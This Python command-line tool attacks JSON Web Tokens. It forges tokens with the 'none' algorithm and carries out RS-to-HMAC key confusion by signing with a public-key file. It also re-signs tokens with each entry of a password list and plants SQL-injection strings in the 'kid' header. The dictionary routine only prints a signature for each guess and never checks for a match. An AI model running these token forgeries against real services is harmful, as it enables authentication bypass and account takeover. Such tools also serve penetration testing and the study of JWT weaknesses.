import base64
import hashlib
import json
import click
import os.path
from os import path
import hmac

from texttable import Texttable


def signature(jwtJson, key):
    if jwtJson["header"]["alg"] == "HS256":
        jwt = encodeJwt(jwtJson)
        signature = hmac.new(key.encode(), jwt.encode(), hashlib.sha256).digest()
        newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
        return jwt + "." + newSig


def encodedToJson(encodedString):
    decode = base64.b64decode(encodedString + '=' * (-len(encodedString) % 4))
    print(json.loads(decode))
    return json.loads(decode)


def encodeJwt(jwtJson):
    headerEncoded = base64.urlsafe_b64encode(
        json.dumps(jwtJson["header"], separators=(',', ':')).encode('UTF-8')).decode('UTF-8').strip('=')
    payloadEncoded = base64.urlsafe_b64encode(
        json.dumps(jwtJson["payload"], separators=(',', ':')).encode('UTF-8')).decode('UTF-8').strip('=')
    return headerEncoded + "." + payloadEncoded


def jwtToJson(jwt):
    jwtSplit = jwt.split('.')
    header = jwtSplit[0]
    payload = jwtSplit[1]
    signature = jwtSplit[2]
    headerJson = encodedToJson(header)
    payloadJson = encodedToJson(payload)
    return {"header": headerJson, "payload": payloadJson, "signature": signature}


def printDecoded(jwt):
    jwtJson = jwtToJson(jwt)
    click.echo(f"Header: {jwtJson['header']}")
    click.echo(f"Payload: {jwtJson['payload']}")
    click.echo(f"Signature: {jwtJson['signature']}")
    jwtEncoded = encodeJwt(jwtJson)
    click.echo(jwtEncoded)


def changeAlg(jwtJson, algo):
    jwtJson["header"]["alg"] = algo
    return jwtJson


def changePayload(jwtJson, payload):
    jwtJson["payload"] = payload
    return jwtJson


def checkHmac(jwtJson, file):
    jwtJson = changeAlg(jwtJson, "HS256")
    return signature(jwtJson, open(file).read())


def bruteforceDict(jwt, fileName):
    jwtJson = jwtToJson(jwt)
    with open(fileName, 'r') as file:
        allPassword = [line.rstrip() for line in file]
    file.close()
    table = Texttable()
    table.set_cols_align(["c", "m"])
    table.set_cols_valign(["m", "m"])
    table.set_max_width(0)
    table.header(["Passord", "Key"])
    for password in allPassword:
        table.add_row([password, signature(jwtJson, password)])
    print(table.draw() + "\n")


def injectSqlKid(jwt, injection):
    jwtJson = jwtToJson(jwt)
    jwtJson["header"]["kid"] = injection
    return signature(jwtJson, "")


@click.command()
@click.argument('jwt')
@click.option("--print", is_flag=True, help="Print Decoded JWT")
@click.option("--payload", "-p", help="New payload json format")
@click.option("--none-vulnerability", '-none', is_flag=True, help="Check None Alg vulnerability")
@click.option("--hmac", help="Check RS/HMAC Alg vulnerability")
@click.option("--bruteforce", help="Bruteforce to guess th secret used to sign the token")
@click.option("--kid", help="Kid Injection sql")
def main(jwt, print, payload, none_vulnerability, hmac, bruteforce, kid):
    if payload:
        jwtJson = changePayload(jwtToJson(jwt), json.loads(payload))
        jwt = encodeJwt(jwtJson) + "." + jwtJson["signature"]
        click.echo(jwt)
    if kid:
        click.echo(injectSqlKid(jwt, kid))
    if bruteforce:
        if path.exists(bruteforce):
            bruteforceDict(jwt, bruteforce)
            pass
        else:
            click.echo("File not found")
    if hmac:
        if path.exists(hmac):
            jwt = checkHmac(jwtToJson(jwt), hmac)
            click.echo(f"\nnew JWT: {jwt}")
        else:
            click.echo("File not found")
    if none_vulnerability:
        jwtJson = changeAlg(jwtToJson(jwt), "none")
        jwt = encodeJwt(jwtJson) + "."
        click.echo(jwt)
    if print:
        printDecoded(jwt)


if __name__ == '__main__':
    main()
